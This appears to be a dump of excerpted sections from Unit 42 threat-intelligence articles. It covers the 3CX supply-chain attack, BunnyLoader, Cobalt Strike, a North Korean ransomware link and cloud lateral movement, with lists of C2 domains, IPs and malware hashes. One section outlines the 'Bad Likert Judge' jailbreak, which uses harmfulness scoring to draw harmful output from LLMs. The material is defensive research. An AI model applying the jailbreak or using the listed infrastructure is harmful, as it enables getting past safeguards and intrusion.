Compromise\n435781ab608ff908123d9f4758132fa45d459956755d27027a52b8c9e61f9589ebd310cb5f63b364c4ce3ca24db5d654132b87728babae4dc3fb675266148fe965ccbd63fbe96ea8830396c575926af476c06352bb88f9c22f90de7bb85366a3903c04976fa6e6721c596354f383a4d4272c6730b29eee00b0ec599265963e747247f33113710e5d9bd036f4c7ac2d847b0bf2ac2769cd8246a10f09d0a41bab4e9d4afc901fa1766e48327f3c9642c893831af310bc18ccf876d44ea4efbf1d709b7e8edb6cc65189739921078b54f0646d38358f9a8993c343b97f3493a4d9\n0e1aa5bb7cdccacfa8cbfe1aa71137b361bea04252fff52a9274b32d0e23e3aa1fafe53644e1bb8fbc9d617dd52cd7d0782381a9392bf7bcab4db77edc20b58b3477b704f6dceb414dad49bf8d950ef55205ffc50d2945b7f65fb2d5f47e48943eb1a41c86b3846d33515536c760e98f5cf0a741c682227065cbafea9d3508064245990f42509474bbc912a02a1e5216c4eb87ea200801e1028291b74e45e43b4de1279596cf5e0b2601f8b719b5240cb00b70c0d6aa0c11e2f32bc3ded020aa4ea43678c3f84a66ce93cff50b11aabbe28c99c058e7043f275fea3456f55b885ae0d9e7ae61f3afb989aaf8e36eda1816ec44ceae666aea87a9fdc6fed35594667b8abb731656c83f2f53815be68cce5d1ace3cb4ed242c9fecd4a66ac2f81678ae3726d5b0815ad2e5a775ecf1a6cd36e1eeeee133b0766158a6b107ef7c347da83a27e4d788ca33b8b05d365fdf803cb68e0df4d69942ba9b7bde546193228a02f01cc3ac71b2c440148fd51b44e260a953e4fc1ee1c3fe787395b8c712ab963cacd7eeebfb09950668bf1c6adf5452b992fc09119835cd256c5d3cf17f91a57b1cfd3e801305856cdb75839de05f03439e264ccdbd1497685878a2605b5abd111240c24a6a188f2664eb15195630b13aa6d9483fc8cfed339dddf803fd4ed8026801e1b78d9bdcb4954c194748d0fdc631594899b29a2746ae425b8bfc79d8db562070b06d835721413a98f757b88d59277bf638467fda2ee254afc692a0d97d666239cc973a38dc788bf017f5d8ae19257561888b61ecff8e086c4e3ea019d7e899777fbe432b2c90b992604599706b4109c3ceaa7946e8548f4c190a191dbf8ae62cc90c837ba12ceee08a1d989732a95bdcef5ca18151ef698ed98a0322b32bb7c791842a6aa604d08208b13db07ccd1fe81f47ea8369537addb26c7b26019b86686c1038326f075663d79803e4412bf9952eae65d7b9278be74ac55c26cccc7e9155bd746e3bb963d40d6edfc001e6d936faf9392202e3788996105a43fa55c88453db0de0c22f3eb0b11d1db9286f3ee423e82704fdce506d3af5164564ca0c436fde9e76f5fa65cbcf483adf1fbfa3d7369b7bb67d2c95457f6bc5585a22e822ade633cee349fd0a9e6a7d083de250fb56189d5a29d3fc5468680c592b1e55ceef3b8a1ecb28721ebf2e8edd109b9b492cf3c0c0d30831c7432e00611f3b0ed65dc98a0d7f5c57512212c6ab0a5de5d6bbf7131d3b7ebf360773c66b437208dfb4a7906635e16a5cbb8a1719dc49c51e73b7783202ab018181b6166e8ececfdc74770885f9dc63b4b2316e8c4a011fd9e382c1ba7c4f09f256925d99f97a47d8d60b8fa65b4ddaf5f43e4352765a91ab053ceb8a3162084df7d0999e2524b2eaf5248eed6b2d20ae5144fb3bb543647cf612e5ca52135d16389f1ac15111a5f33b3c51a26f814b64c891791ff21104ee75a4773fef86dfc7a8e7cacd9908f50c9dd97a2ce22ee57ba3e014e204369e5b75b88cefb270dc44a5ca50ddc96ac931762065fc085be8138c38f2b6b52095a42b34bc415c9572de17386ae9b832fa02235b95a65ad716342d01ae87fcdb686b448e8462d6e86c1f4b3156f055577220c7dc4be46510b9fed4ecfa78920025d1b2ac5853b5bf7ea136cf37f7ae6b5ed444abfceda7217b9158895ed28cfdd946bf3e5c729570a5c29d5d82b843d7498506ddc272e183bbe90cf73cc4779b37341108e002923aa938ca916977dec8fc40ff9332eb6d40ded23d606c88d9fa3785a820ea7b1ef0d12a5c4447f52fb7ba5061ee4144439ff652c0b4f3cf941fe37fbd66e9d7672dd213fbcdb2beee37fb9cf3e02121b2169399948c1b0830a626d4ed27a617813fa67dd91d58b4c11c97d23ea830bd13ad4a05a87be5d8cc55ebdf1e1b458fd68bea71d80b54f1425cff3d28afe5245459afa6d7985081bc6a62f86dce64c63daeb2136d7d2cc619edb3fa8636c50b59a42d0bdc4c71cbd46a0586b683773e9a5e509f68817650a479f16713d03b95103e0a95a3d575b7263bd16c334258eefa3ae8f46e3d1d83b5c6d73f3fc893dbd7effa7c50dc9b2455ec053aa9c51d70e13305ecf21fa402894fa01c9b82dcfd93e35f49a0d5408f7f4f8a25f33ad17426bb00afa71f6398ba86c1273b5e8d68ce90ac1745d16335c5e04ec76e8c58448ae6c91136fc4d5fa5b5dddfe588791b59c945beba1f57a74bd58b53a09d38ac8a8679a0541f16\n164[.]68[.]114[.]29167[.]86[.]87[.]2763[.]250[.]53[.]18045[.]15[.]19[.]13046[.]39[.]229[.]17www.zxlab.iol4cky[.]menbtc-trazer[.]xyzsandbox[.]x4k[.]memalware[.]x4k[.]mef[.]x4k[.]me0[.]x4k[.]mepwn[.]x4k[.]medocker[.]x4k[.]meapk[.]x4k[.]mex4k[.]mepowershell[.]servicesvmi378732[.]contaboserver[.]netx4k[.]inL4cky[.]menm[.]x4k[.]memx2[.]l4cky[.]commailhost[.]l4cky[.]comwww1[.]l4cky[.]comauthsmtp[.]l4cky[.]comns[.]l4cky[.]commailer[.]l4cky[.]comimap2[.]l4cky[.]comns2[.]l4cky[.]comserver[.]l4cky[.]comauth[.]l4cky[.]comremote[.]l4cky[.]commx10[.]l4cky[.]comms1[.]l4cky[.]commx5[.]l4cky[.]comrelay2[.]l4cky[.]comns1[.]l4cky[.]comemail[.]l4cky[.]comimap[.]l4cky[.]commail[.]x4k[.]merepo[.]x4k[.]mebw[.]x4k[.]mecollabora[.]x4k[.]mecloud[.]x4k[.]meyacht[.]x4k[.]mebook[.]x4k[.]meteleport[.]x4k[.]mesubspace[.]x4k[.]mewindows[.]x4k[.]mesf[.]x4k[.]medc-b00e12923fb6.l4cky[.]menbox[.]l4cky[.]menmail[.]l4cky[.]menwww[.]l4cky[.]menmta-sts[.]l4cky[.]menldap[.]l4cky[.]mencloud[.]l4cky[.]menoffice[.]l4cky[.]menrexdooley[.]mlrelay2[.]kuimvd[.]runs2[.]webmiting[.]ruhttps://\u0444\u0441\u0431[.]com\nAdditional Resources\n2022 Unit 42 Ransomware Threat Report Highlights", "source": "Palo"}, {"title": "Introduction", "content": "On Oct. 16, 2023, Cisco published a security advisory detailing an actively exploited privilege escalation zero-day vulnerability impacting Cisco IOS XE devices. The vulnerability (CVE-2023-20198) has a criticality score of 10, according to theNational Vulnerability Database, and it would allow an attacker to create an account with the highest privileges possible.\nAccording to our attack surface telemetry fromCortex Xpanse, analysts observed 22,074 implanted IOS XE devices on Oct. 18, 2023. Telemetry as of Oct. 19, 2023 shows 18,359 impacted devices, and we expect the number to continue to decrease as the implant is no longer persistent. (Note: Implant is a term commonly used to describe a backdoor or malware.)\nCisco recommends customers disable the HTTP Server feature on all internet-facing systems or untrusted networks.\nPalo Alto Networks customers receive protections from and mitigations for the Cisco IOS XE Web UI Privilege Escalation Vulnerability in the following ways:\nNext-Generation Firewall with Advanced Threat Prevention security subscription should use best practices via the following Threat Prevention signatures:86807,94454. \n86807,94454. \nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others. \nCortex Xpanse has the ability to identify exposed Cisco IOS XE devices on the public internet and escalate these findings to defenders. These findings are also available for Cortex XSIAM customers who have purchased the Attack Surface Management (ASM) module.\nPalo Alto Networks also recommends followingCisco's guidelines for all IOS XE devices.", "source": "Palo"}, {"title": "Conclusion", "content": "Based on the amount of publicly available information, along with our own analysis, Palo Alto Networks recommends following Cisco's recommendations immediately. For all potentially impacted organizations, we also recommend reviewing your systems for signs of a backdoor implant installation and new user account creation.\nPalo Alto Networks and Unit 42 will continue to monitor the situation for updated information, release of proof of concept code and evidence of additional exploitation.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nPalo Alto Networks customers receive protection from our products, as listed below. We will update this threat brief as more relevant information becomes available.", "source": "Palo"}, {"title": "Introduction", "content": "This article will focus on the newly released BunnyLoader 3.0, as well as historically observed BunnyLoader infrastructure and an overview of its capabilities. BunnyLoader is dynamically developing malware with the capability to steal information, credentials and cryptocurrency, as well as deliver additional malware to its victims.\nIn an increasingly cutthroat market, cybercriminals must regularly update and retool their malware to compete with other cybercriminals, security tools and researchers alike. Since its initial discovery in September of 2023, BunnyLoader malware as a service (MaaS) has frequently updated its functionality to include the following:\nBug fixes \nAdditional antivirus evasion and protections \nMultiple data recovery functionalities for the stealer portionAdditional browser pathsKeylogger functionality \nAdditional browser paths \nKeylogger functionality\nAdditional activity discovered in October 2023 by Unit 42 threat researchers revealed the threat actor continued to modify and retool BunnyLoader. The threat actor frequently changed their tactics in an effort to deliver and execute the malware in what appears to be an attempt to further obfuscate and evade detection.\nSamples collected during this time included packed binaries using PureCrypter, UPX and Themida during various campaigns in November. In December, the BunnyLoader payload was delivered as a follow-up payload to a PureCrypter infection using a novel .NET injector. Threat actors changed filenames of the malware to mimic legitimate video games and other applications.\nFrequent changes in tactics, techniques and procedures (TTPs) like infrastructure, packers, encryption and method of exfiltration help the attacker evade detection. It's also meant to undermine cybersecurity researchers' ability to detect and analyze the threat actor's activities.\nOn Feb. 11, 2024, the threat actor behind BunnyLoader announced the release of BunnyLoader 3.0, boasting the malware has been \"completely redesigned and enhanced by 90%.\"\nThe threat actor claims enhancements to BunnyLoader payloads include:\nPayloads/modules \"completely rewritten for improved performance\" \nReduced payload size \nAdvanced keylogging capabilities\nBy revealing the threat actor's continued development of the malware and its evolving TTPs, we aim to empower readers to detect and hopefully prevent this threat.\nPalo Alto Networks customers are better protected from BunnyLoader throughCortex XDRandXSIAM, as well as throughPrisma Cloud. Customers are also better protected through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire,DNS Security, andAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "In the ever changing landscape of MaaS, BunnyLoader continues to evolve, demonstrating the need for threat actors to frequently retool to evade detection. Revealing these evolving tactics and the dynamic nature of this threat empowers readers to bolster their defense posture and better protect their assets.", "source": "Palo"}, {"title": "Introduction", "content": "We identified a cluster of activity that we track asCL-STA-0048. This cluster targeted high-value targets in South Asia, including a telecommunications organization.\nThis activity cluster used rare tools and techniques including the technique we call Hex Staging, in which the attackers deliver payloads in chunks. Their activity also includes exfiltration over DNS usingping, and abusing theSQLcmdutility for data theft.\nBased on an analysis of the tactics, techniques and procedures (TTPs), as well as the tools used, the infrastructure and the victimology, we assess with moderate-high confidence that this activity originates in China.\nThe campaign primarily aimed to obtain the personal information of government employees and steal sensitive data from targeted organizations. These objectives bear the hallmarks of a nation-state advanced persistent threat (APT) espionage operation.\nThe threat actor behind this campaign demonstrated a methodical approach to network penetration to establish a foothold. We observed systematic attempts to exploit known vulnerabilities on public-facing servers, specifically targeting the following services:\nIIS \nApache Tomcat \nMSSQL services\nOrganizations that protect sensitive information should focus on patching commonly exploited vulnerabilities. They should also follow best practices for IT hygiene, as APTs frequently attempt to gain access using methods that have proven successful in the past.\nWe are sharing our analysis to provide defenders with means to detect and protect themselves against such advanced attacks.\nPalo Alto Networks customers are better protected from the threats discussed in this article throughCortex XDRandXSIAM.\nCustomers are also better protected through the following products and services:\nCloud-Delivered Security Servicesfor theNext-Generation Firewall, includingAdvanced WildFire,Advanced URL FilteringandAdvanced DNS Security. \nCortex Xpanseprovides proactive detection of potential adversary entry points\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "The CL-STA-0048 campaign represents a significant threat, targeting government and telecom entities in South Asia with a clear focus on espionage. The threat actor behind it leverages tactics to evade detection, bypass security measures and exfiltrate sensitive data from high-value targets.\nCL-STA-0048 exploits unpatched vulnerabilities in widely used services such as IIS, Apache Tomcat and MSSQL. It adapts to new defenses and deploys rarely seen techniques, adjusting its methods to overcome defenses and achieve its objectives.\nOur analysis indicates a strong link between this group and the Chinese nexus based on the observed tools, techniques and victimology.\nThese findings emphasize the critical need for organizations to prioritize proactive cybersecurity measures. Addressing known vulnerabilities, maintaining robust IT hygiene and employing vigilant threat monitoring are essential to counter adversaries like CL-STA-0048. Organizations can better protect sensitive data and defend against advanced and persistent threats by strengthening security measures and staying informed about emerging threats.", "source": "Palo"}, {"title": "Introduction", "content": "On March 29, 2023, there was a supply chain attack involving a software-based phone application called3CXDesktopApp. As of March 30, the 3CXDesktopApp installer hosted on the developer's website will install the application with two malicious libraries included. The malicious libraries will ultimately run shellcode to load a backdoor on the system that allows actors to install additional malware on the victim machine.\nOn March 31, 2023, we updated this blog to include a Next-Generation Firewall protections summary.\nOn April 3, 2023, we updated this blog to include an XSOAR protections summary. For Cortex XDR and XSIAM, we specified the content version for MacOS coverage.All XDR customers are and were protected with no upgrade required.\nAt this time, we cannot determine exactly how these malicious libraries were included in the 3CXDesktopApp installer. We speculate that threat actors might have introduced these malicious libraries during the build process of the 3CXDesktopApp application. Because malicious content was added to this legitimate application in order to compromise the users of 3CXDesktopApp, it could suggest that this is intended to be a supply chain attack.\n3CX products are widely used across the globe. Our Cortex Xpanse product was able to fingerprint 247,277 distinct IP addresses in 199 countries that are using 3CX applications.\nBetween March 9-30, 2023, we observed activity at 127 Cortex XDR customers that involved the 3CXDesktopApp process attempting to run shellcode, which was blocked by the XDR Agent's In-process Shellcode Protection Module. Due to blocking the shellcode, we were unable to obtain the secondary payload used in this attack, so we cannot determine its capabilities or any post-exploitation activities carried out by the threat actor.", "source": "Palo"}, {"title": "Conclusion", "content": "The 3CXDesktopApp supply chain attack has received significant attention, as these products are widely used, with at least 247,000 systems across the globe according to our Xpanse product. The compromised 3CXDesktopApp application was seen in the environments of 127 of our customers, and we blocked the execution of the malicious shellcode executed by the application via the XDR Agent's In-process Shellcode Protection Module.\nAt this time, the malicious 3CXDesktopApp installers do not have any active C2 domains to communicate with. However, systems that have run the known compromised 3CXDesktopApp versions or communicated with any of the C2 URLs should be investigated for potential compromise.", "source": "Palo"}, {"title": "Indicators", "content": "Domains\nmsstorageazure[.]com \nofficestoragebox[.]com \nvisualstudiofactory[.]com \nazuredeploystore[.]com \nmsstorageboxes[.]com \nofficeaddons[.]com \nsourceslabs[.]com \nzacharryblogs[.]com \npbxcloudeservices[.]com \npbxphonenetwork[.]com \nakamaitechcloudservices[.]com \nazureonlinestorage[.]com \nmsedgepackageinfo[.]com \nglcloudservice[.]com \npbxsources[.]com\nUpdated April 3, 2023, at 4:45 p.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "Evidence suggests that North Korean IT workers are using real-time deepfake technology to infiltrate organizations through remote work positions, which poses significant security, legal and compliance risks. The detection strategies we outline in this report provide security and HR teams with practical guidance to strengthen their hiring processes against this threat.\nIn our demonstration, it took just over an hour with no prior experience to figure out how to create a real-time deepfake using readily available tools and cheap consumer hardware. This allows adversaries to easily create convincing synthetic identities, enabling them to operate undetected and potentially generate revenue for sanctioned regimes.\nWhile we can still detect limitations in current deepfake technology, these limitations are rapidly diminishing. Organizations must implement layered defenses by combining enhanced verification procedures, technical controls and ongoing monitoring throughout the employee lifecycle.\nPalo Alto Networks customers are better protected from the threats discussed in this article throughUnit 42 Insider Threat Services.\nOrganizations can engage theUnit 42 Incident Response teamfor specific assistance with this threat and others.", "source": "Palo"}, {"title": "Conclusion", "content": "The synthetic identity threat typified by North Korean IT worker operations represents an evolving challenge for organizations worldwide. Our research demonstrates the alarming accessibility of synthetic identity creation, with continuously lowering technical barriers as AI-generated faces, document forgery tools and real-time voice/video manipulation technologies become more sophisticated and readily available.\nAs synthetic identity technologies continue to evolve, organizations must implement layered defense strategies that combine:\nEnhanced verification procedures \nAI-assisted countermeasures for deepfake detection \nContinuous verification throughout employment\nThis approach significantly improves an organization's ability to detect and mitigate against not only North Korean IT workers but also a variety of similar threats.\nNo single detection method will guarantee protection against synthetic identity threats, but a layered defense strategy significantly improves your organization's ability to identify and mitigate these risks. By combining HR best practices with security controls, you can maintain an efficient hiring process while protecting against the sophisticated tactics employed by North Korean IT workers and similar threat actors.\nPalo Alto Networks customers can better protect against the threats discussed above through Unit 42Insider Threat Servicesto holistically improve detection and remediation.\nIf you think you might have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "This article presents what we are calling the \"Bad Likert Judge\" technique. Text-generation large language models (LLMs) have safety measures designed to prevent them from responding to requests with harmful and malicious responses. Research into methods that can bypass these guardrails, such as Bad Likert Judge, can help defenders prepare for potential attacks.\nThe technique asks the target LLM to act as a judge scoring the harmfulness of a given response using the Likert scale, a rating scale measuring a respondent's agreement or disagreement with a statement. It then asks the LLM to generate responses that contain examples that align with the scales. The example that has the highest Likert scale can potentially contain the harmful content.\nWe have tested this technique across a broad range of categories against six state-of-the-art text-generation LLMs. Our results reveal that this technique can increase the attack success rate(ASR)by more than 60% compared to plain attack prompts on average.\nGiven the scope of this research, it was not feasible to exhaustively evaluate every model. To ensure we do not create any false impressions about specific providers, we have chosen to anonymize the tested models mentioned throughout the article.\nIt is important to note that this jailbreak technique targets edge cases and does not necessarily reflect typical LLM use cases. We believe most AI models are safe and secure when operated responsibly and with caution.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Our results demonstrate the effectiveness of the Bad Likert Judge technique in increasing the ASR across multiple LLMs and jailbreak categories. By leveraging the LLM's understanding of harmful content and its ability to evaluate responses, this technique can significantly increase the chances of successfully bypassing the model's safety guardrails.\nOur study also highlights the importance of applying content filtering systems alongside LLMs for jailbreak mitigation. The results show that content filters can reduce the ASR by an average of 89.2 percentage points across all tested models. This indicates the critical role of implementing comprehensive content filtering as a best practice when deploying LLMs in real-world applications.\nDespite the effectiveness of content filtering, it is essential to acknowledge that it is not a perfect solution. Determined adversaries could still find ways to circumvent these filters, and there is always the possibility of false positives or false negatives in the filtering process.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has identified Jumpy Pisces, a North Korean state-sponsored threat group associated with theReconnaissance General Bureauof the Korean People's Army, as a key player in a recent ransomware incident. Our investigation indicates a likely shift in the group's tactics. We believe with moderate confidence that Jumpy Pisces, or a faction of the group, is now collaborating with the Play ransomware group (Fiddling Scorpius).\nThis change marks the first observed instance of the group using existing ransomware infrastructure, potentially acting as aninitial access broker(IAB) or an affiliate of the Play ransomware group. This shift in their tactics, techniques and procedures (TTPs) signals deeper involvement in the broader ransomware threat landscape.\nJumpy Pisces, also known as Andariel and Onyx Sleet, was historically involved in cyberespionage, financial crime and ransomware attacks. The group wasindicted by the U.S Justice Departmentfor deploying custom-developed ransomware, Maui.\nWe expect their attacks will increasingly target a wide range of victims globally. Network defenders should view Jumpy Pisces activity as a potential precursor to ransomware attacks, not just espionage, underscoring the need for heightened vigilance.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products:\nCortex XDRandXSIAM \nAdvanced WildFire \nAdvanced URL FilteringandAdvanced DNS Security\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "It remains unclear whether Jumpy Pisces has officially become an affiliate for Play ransomware or if they acted as an IAB by selling network access to Play ransomware actors. If Play ransomware does not provide a RaaS ecosystem as it claims, Jumpy Pisces might only have acted as an IAB.\nEither way, this incident is significant because it marks the first recorded collaboration between the Jumpy Pisces North Korean state-sponsored group and an underground ransomware network. This development could indicate a future trend where North Korean threat groups will increasingly participate in broader ransomware campaigns, potentially leading to more widespread and damaging attacks globally.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 Hashes\n243ad5458706e5c836f8eb88a9f67e136f1fa76ed44868217dc995a8c7d07bf7 \n2b254ae6690c9e37fa7d249e8578ee27393e47db1913816b4982867584be713a \nf64dab23c50e3d131abcc1bdbb35ce9d68a34920dd77677730568c24a84411c5 \n99e2ebf8cec6a0cea57e591ac1ca56dd5d505c2c3fc8f4c3da8fb8ad49f1527e \nb4f5d37732272f18206242ccd00f6cad9fbfc12fae9173bb69f53fffeba5553f \nb1ac26dac205973cd1288a38265835eda9b9ff2edc6bd7c6cb9dee4891c9b449\nSliver C2 Server Information\n172.96.137[.]224 \namericajobmail[.]site\nCode Signing Certificate Details\nSHA256 hash:b4f5d37732272f18206242ccd00f6cad9fbfc12fae9173bb69f53fffeba5553fChain:6e95d94d5d8ed2275559256c5fb5fc6d01da6b46Issuer: CN=LAMERA CORPORATION LIMITEDNotBefore: 2/10/2022 9:44 PMNotAfter: 12/31/2039 4:59 PMSubject: CN=LAMERA CORPORATION LIMITEDSerial:879fa942f9f097b74fd6f7dabcf1745aCert:6e95d94d5d8ed2275559256c5fb5fc6d01da6b46\nSHA256 hash:f64dab23c50e3d131abcc1bdbb35ce9d68a34920dd77677730568c24a84411c5Chain:6624c7b8faac176d1c1cb10b03e7ee58a4853f91Issuer: CN=Tableau Software Inc.NotBefore: 5/27/2023 11:15 AMNotAfter: 12/31/2039 4:59 PMSubject: CN=Tableau Software Inc.Serial:76cb5d1e6c2b6895428115705d9ac765Cert:6624c7b8faac176d1c1cb10b03e7ee58a4853f91", "source": "Palo"}, {"title": "Introduction", "content": "While advanced persistent threats get the most breathless coverage in the news, many threat actors have money on their mind rather than espionage. You can learn a lot about the innovations used by these financially motivated groups by watching banking Trojans.\nBecause attackers constantly create new techniques to evade detection and perform malicious acts, studying monetarily motivated malware can help defenders understand threat actor tactics and protect organizations more effectively. Some of the banking Trojans described here are historically known for being financial malware, but now they're primarily used as infrastructure to deliver other malware. Which is to say, by preventing techniques used by banking Trojans, you can also stop other types of threats.\nWe'll survey techniques used by notorious banking Trojan families to evade detection, steal sensitive data and manipulate data. We'll also describe how those techniques can be blocked. These families include Zeus, Kronos, Trickbot, IcedID, Emotet and Dridex.\nPalo Alto Networks customers are protected from such attacks usingCortex XDRandWildFire.", "source": "Palo"}, {"title": "Conclusion", "content": "Threat actors who are in it for the money use a wide range of malware techniques for injection and financial fraud, and they are always looking for new ways to develop evasive techniques. We have explored some of the more interesting banking Trojan techniques and how they're used to steal victims' sensitive data. And finally, we describe how these techniques can be used to detect malicious behavior, so it can be prevented.\nPalo Alto Networks customers using Cortex XDR receive protections from such attacks in different layers, including the following:\nLocal Analysis Machine Learning module \nBehavioral Threat Protection \nBehavioral indicators of compromise (BIOC) and Analytics BIOCs rules\nThese layers identify the tactics and techniques that banking Trojans use at different stages of their execution.\nPalo Alto Networks customers also receive protections against the attacks discussed here through the WildFire cloud-delivered security subscription for the Next-Generation Firewall.", "source": "Palo"}, {"title": "Indicators", "content": "Trickbottestnewinj32Dll.dll:4becc0d518a97cc31427cd08348958cda4e00487c7ec0ac38fdcd53bbe36b5ccWebinjects:ef6603a7ef46177ecba194148f72d396d0ddae47e3d6e86cf43085e34b3a64d4 \ntestnewinj32Dll.dll:4becc0d518a97cc31427cd08348958cda4e00487c7ec0ac38fdcd53bbe36b5cc \nWebinjects:ef6603a7ef46177ecba194148f72d396d0ddae47e3d6e86cf43085e34b3a64d4 \nEmotet:dd20506b3c65472d58ccc0a018cb67c65fab6718023fd4b16e148e64e69e5740 \nKronos:aad98f57ce0d2d2bb1494d82157d07e1f80fb6ee02dd5f95cd6a1a2dc40141bc \nZeus:0f409bc42d5cd8d28abf6d950066e991bf9f4c7bd0e234d6af9754af7ad52aa6 \nIcedID:358af26358a436a38d75ac5de22ae07c4d59a8d50241f4fff02c489aa69e462f \nDridex:ffbd79ba40502a1373b8991909739a60a95e745829d2e15c4d312176bbfb5b3e", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers identified two Cobalt Strike Team Server instances hosted on the internet and uncovered new profiles that are not available on public repositories. We will highlight the distinct techniques attackers use to exploit the Cobalt Strike platform and circumvent signature-based detections.\nWe identified Team Server instances connected to the internet that host Beacon implants and provide command-and-control (C2) functionality. We have also extracted the Malleable C2 profile configuration from the Beacon binary to help us understand the various methods used to evade conventional detections.\nThe operators of the Cobalt Strike Team Servers attempted to conceal their C2 infrastructure behind benign and well-known services to evade detection. We have also found Team Server C2 infrastructure hosted on well-known public cloud infrastructure providers. The operators also deployed new Malleable C2 profiles. Threat and red team actors create new profiles to deceive security controls, bypass security measures and avoid detection. These tactics involve modifying HTTP URLs, header parameters and host headers with harmless and widely recognized domains.\nPalo Alto Networks customers receive protections and mitigations for Cobalt Strike Beacon and Team Server C2 communication in the following ways:\nThe Next-Generation Firewall (NGFW) with anAdvanced Threat Preventionsubscription can identify and block Cobalt Strike HTTP C2 requests generated by custom profiles and block Cobalt Strike HTTP C2 requests and responses that are masked with the Base64-encoding settings of the default profile (signatures 86445 and 86446). \nWildFireandCortex XDRcan identify and block Cobalt Strike Beacon binaries, and XDR will report related exploitation attempts. \nCortex XSOAR response pack and playbookcan automate the mitigation process. \nMalicious URLs and IPs have been added toAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "Cobalt Strike is a highly versatile tool, and most security vendors struggle to detect its C2 traffic accurately. This makes Cobalt Strike an ideal choice for attackers looking to increase their malware's chances of success.\nWe are continuously discovering new Team Servers that host active Beacon binaries. This threat hunting has proven fruitful against the misuse of Cobalt Strike in cyberattacks. The continuous cycle of scanning and learning helps us remain vigilant and provide active defenses against cybercrime.\nPalo Alto Networks customers receive protection from the attack above with the following products:\nTheNext-Generation Firewallwith anAdvanced Threat Preventionsubscription can identify and block the Cobalt Strike HTTP C2 request in nondefault profiles. ATP signatures 86445 and 86446 can identify HTTP C2 requests with the Base64 metadata encoding in default profiles. \nWildFire, an NGFW security subscription andCortex XDRidentify and block CobaltStrike Beacon. \nCortex XSOAR response pack and playbook can automate the mitigation process. \nCortex XDR will report related exploitation attempts. \nMalicious URLs and IPs have been added toAdvanced URL Filtering.", "source": "Palo"}, {"title": "Introduction", "content": "In this post, we examine lateral movement techniques, showcasing some that we have observed in the wild within cloud environments. Lateral movement can be achieved by leveraging both cloud APIs and access to compute instances, with access at the cloud level potentially extending to the latter.\nWe explore cloud lateral movement techniques in all three major cloud providers: Amazon Web Services (AWS), Google Cloud Platform (GCP) and Microsoft Azure, highlighting their differences compared to similar techniques in on-premises environments.\nAttackers often use different lateral movement techniques to gain access to sensitive data within an organization's network.Lateral movement techniques can certainly be part of attackers' approach to on-premises environments, and many of the scenarios we discuss could have similarities to situations on-premises. Here, we focus on lateral movement techniques as we specifically observe them used in cloud environments, with the aim of helping defenders better prepare to improve their cloud security posture.\nIn cloud environments, attackers operate at two levels: the host or instance, and the cloud infrastructure. This approach allows them to seamlessly combine traditional lateral movement techniques with cloud-specific methods.\nCloud providers offer measures like network segmentation and granular IAM management to limit lateral movement, along with centralized logging to detect this movement. However, cloud APIs do still provide additional mechanisms that attackers could abuse, and misconfigurations can open up further opportunities for malicious behavior.\nThis article will show how both agent and agentless solutions come together to protect against lateral movement, with each contributing unique strengths. This can help defenders understand why combining both solutions ensures comprehensive coverage in the cloud.\nCortex XDRandPrisma Cloudprovide protection from the lateral movement techniques discussed here. If you think you might have been impacted or have an urgent matter, get in touch with theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Introduction", "content": "Exploring lateral movement in the cloud versus on-premises reveals a marked difference. Each environment has its challenges for defenders. In cloud environments, overly permissive access policies and misconfigured resources can expand opportunities for threat actors to abuse cloud features.\nThese opportunities introduce a different set of lateral movement techniques. When combined with powerful API access within the cloud, this could potentially result in gaining access to compute instances running within the environment.\nIn cloud services, APIs play a pivotal role in communication, as well as in facilitating lateral movement. When attackers are equipped with the right cloud permissions, which are typically write access, they can directly interact with cloud services by executing API calls. In such cases, the barrier between access within the cloud and access to compute instances may not be particularly strong, which enables attackers to create or modify cloud resources, effectively streamlining lateral movement.\nThe scalability of cloud environments \u2013 allowing on-demand resource provisioning \u2013 simplifies this process, as attackers can effortlessly create new compute instances to expand their operations and take control over existing ones.", "source": "Palo"}, {"title": "Conclusion", "content": "Attackers with sufficient privileges at the cloud API level can take advantage of the characteristics of cloud environments for lateral movement using cloud APIs. Cloud APIs often enable attackers to pivot through compute instances with relative ease compared to traditional lateral movement in typical on-premises environments. However, on-premises environments, especially virtualized environments with the equivalent power available to an attacker with access to the virtualization layer, have plenty of risks of this type as well.\nFor some of the scenarios described, there may be detections and remediations available from CSPs or other sources. Defenders should be aware of the options available to improve their cloud security posture.\nSince misconfigurations and similar issues can often weaken organizations' cloud 